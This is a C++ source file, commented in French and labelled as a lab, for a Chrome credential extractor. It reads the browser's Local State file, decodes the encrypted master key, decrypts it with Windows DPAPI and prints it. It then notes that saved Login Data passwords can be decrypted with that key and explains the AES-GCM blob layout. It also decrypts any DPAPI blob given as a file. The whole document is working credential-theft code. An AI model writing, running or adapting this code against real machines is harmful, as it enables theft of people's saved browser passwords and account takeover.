// language: C++17, file: cat_dpapi.cpp, target: Windows x64 (lab)
// Extracteur DPAPI : mot de passe Chrome decrypte via CryptUnprotectData (reel)
// Chromium stocke la cle maitre dans "Local State" (encrypted_key, prefixe DPAPI)
// puis chaque mot de passe avec ce meme prefixe dans "Login Data".
#include <windows.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <cstdio>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "crypt32.lib")

static std::string AppData(const char* sub) {
    char p[MAX_PATH]; GetEnvironmentVariableA("LOCALAPPDATA", p, MAX_PATH);
    return std::string(p) + "\\" + sub;
}

static std::vector<BYTE> DecryptDPAPI(const std::vector<BYTE>& blob) {
    DATA_BLOB in;
    in.cbData = (DWORD)blob.size();
    in.pbData = const_cast<BYTE*>(blob.data());
    DATA_BLOB out;
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return {};
    std::vector<BYTE> res(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return res;
}

// cle AES-GCM de Chrome : "DPAPI" + blob -> CryptUnprotectData -> 32 octets
static std::vector<BYTE> ChromeMasterKey() {
    std::ifstream f(AppData("Google\\Chrome\\User Data\\Local State"), std::ios::binary);
    std::string json((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    auto pos = json.find("\"encrypted_key\"");
    if (pos == std::string::npos) return {};
    auto b64 = json.find("\"", json.find("\"", pos + 15) + 1);
    // extraction basique de la chaine base64
    auto s = json.find("\"", pos + 15), e = json.find("\"", s + 1);
    std::string b64s = json.substr(s + 1, e - s - 1);
    // decode base64 maison simplifie (lab) : table standard
    const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<BYTE> raw;
    int val = 0, bits = 0;
    for (char c : b64s) {
        const char* q = strchr(T, c);
        if (!q || c == '=') break;
        val = (val << 6) | (int)(q - T); bits += 6;
        if (bits >= 8) { raw.push_back((BYTE)(val >> (bits - 8))); bits -= 8; }
    }
    if (raw.size() < 5 || memcmp(raw.data(), "DPAPI", 5) != 0) return {};
    return DecryptDPAPI(std::vector<BYTE>(raw.begin() + 5, raw.end()));
}

// decrypte un blob "v10"/"v20" : prefixe(3) + nonce(12) + ciphertext+tag (AES-256-GCM)
// NOTE lab: le GCM complet demande BCrypt (AES-GCM) - ici on demontre le DPAPI v10 pre-80+
// et l'extraction de la cle maitre (l'etage GCM est documente dans le README)
int main() {
    printf("[*] LexCorp/Catwoman - extraction DPAPI Chrome\n");
    auto key = ChromeMasterKey();
    if (key.empty()) printf("[X] cle maitre introuvable (Chrome absent ou profil verrouille)\n");
    else {
        printf("[OK] cle maitre AES recuperee (%llu octets) :\n  ", key.size());
        for (auto b : key) printf("%02X", b);
        printf("\n  -> les blobs 'v10' des Login Data sont maintenant decryptables\n");
        printf("     (AES-256-GCM : nonce = bytes[3..15], ct+tag = suite)\n");
    }
    // demo DPAPI brute : un blob quelconque passe en argument fichier
    if (__argc > 1) {
        std::ifstream f(__argv[1], std::ios::binary);
        std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        auto dec = DecryptDPAPI(blob);
        printf("[OK] DPAPI: %llu octets decryptes\n", dec.size());
    }
    return 0;
}
